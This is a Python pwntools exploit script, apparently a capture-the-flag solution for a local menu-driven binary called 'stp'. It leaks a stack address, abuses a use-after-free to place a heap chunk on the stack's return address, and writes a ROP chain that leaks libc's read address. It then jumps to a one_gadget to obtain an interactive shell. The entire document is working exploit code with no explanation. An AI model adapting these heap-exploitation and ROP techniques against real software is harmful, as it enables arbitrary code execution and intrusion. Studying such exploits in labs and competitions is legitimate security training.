from pwn import *

got_read = 0x404038 

one_gadget_offset = 0xc84da
pop_rsp = 0x0000000000401c65 # pop rsp; pop r13; pop r14; pop r15; ret;
pop_r12 = 0x0000000000401c64 # pop r12, pop r13, pop r14, pop r15; ret;

call_puts = 0x401040
pop_rdi = 0x401c6b
market_call = 0x4011C7

if __name__ == "__main__":

	#p = remote( "", )
	p = process( ["./ld-linux-x86-64.so.2", "--library-path", "libs/", "./stp"] )
	libc = ELF( "./libc.so.6" )

	# b *malloc plane name
	# b *malloc plane commnet
	# b *free plane name
	# b read new plane name

	# gdb.attach( p, '''b *0x40190B
	# 	b *0x4019B6
	# 	b *0x4017DF
	# 	b *0x4012ab
	# 	b *0x401353
	# 	continue'''
	# )

	p.recvuntil( ": " )
	p.send( "a" * 128 )
	p.recvuntil( "> " )
	p.send( "6\n" )

	data = p.recvline()
	p.recvuntil( "> " )
	leak = u64( data.strip().split(' ' )[4][128:].ljust( 8, '\x00' ) ) #[128:]
	
	RA = leak - 8
	name_addr = leak - 112

	print "leak: 0x%x" % leak
	print "RA: 0x%x" % RA

	# make chunk
	p.send( "1\n" )
	p.recvuntil( ": " )
	p.send( "128\n" ) # name size 
	p.recvuntil( ": " )
	p.send( "test_data\n" ) # name
	p.recvuntil( ": " )
	p.send( "1337\n" ) # cost
	p.recvuntil( ": " )
	p.send( "N\n" )
	p.recvuntil( "> ")

	# edit plane name
	p.send( "5\n" )
	p.recvuntil( ": " )
	p.send( "0\n" )
	p.recvuntil( ": " )
	p.send( "test\n" ) 
	p.recvuntil( "> " )

	# delete chunk 
	p.send( "2\n" )
	p.recvuntil( ": " )
	p.send( "0\n" ) # chunk id  
	p.recvuntil( "> " )

	# edit plane name
	p.send( "5\n" )
	p.recvuntil( ": " )
	p.send( "0\n" )
	p.recvuntil( ": " )
	p.send( p64( RA ) )
	p.recvuntil( "> " )

	# make chunk
	p.send( "1\n" )
	p.recvuntil( ": " )
	p.send( "128\n" ) # name size 
	p.recvuntil( ": " )
	p.send( "test_data\n" ) # name
	p.recvuntil( ": " )
	p.send( "1337\n" ) # cost
	p.recvuntil( ": " )
	p.send( "N\n" )
	p.recvuntil( "> ")

	p.send( "1\n" )
	p.recvuntil( ": " )
	# !!!!!!!!!!!
	# SPAWN CHUNK ON RETURN ADDRESS ON STACK
	p.send( "128\n" )
	p.recvuntil( ": " )

	payload = p64( pop_rdi )
	payload += p64( got_read )
	payload += p64( call_puts )
	payload += p64( market_call )
	payload += p64( pop_rsp )
	payload += p64( name_addr )
	payload += p64( 0x0 ) * 3 

	p.send( payload )

	p.recvuntil( ": " )
	p.send( "1337\n" ) # cost
	p.recvuntil( ": " )
	p.send( "N\n" )
	p.recvuntil( "> ")

	for i in range( 0, 2 ):
		p.send( "13\n" )
		p.recvuntil( "> " )

	p.send( "13\n" )
	read_leak = u64( p.recvline().strip().ljust( 8, '\x00' ) )
	p.recvuntil( ": ")

	libc_base = read_leak - libc.symbols[ 'read' ]
	one_gadget = libc_base + one_gadget_offset

	payload = p64( 0x0 ) * 3
	payload += p64( pop_r12 )
	payload += p64( 0x0 ) * 4 
	payload += p64( one_gadget ) 
	payload += '\x00' * 0x60

	p.send( payload )

	p.interactive()
	p.close()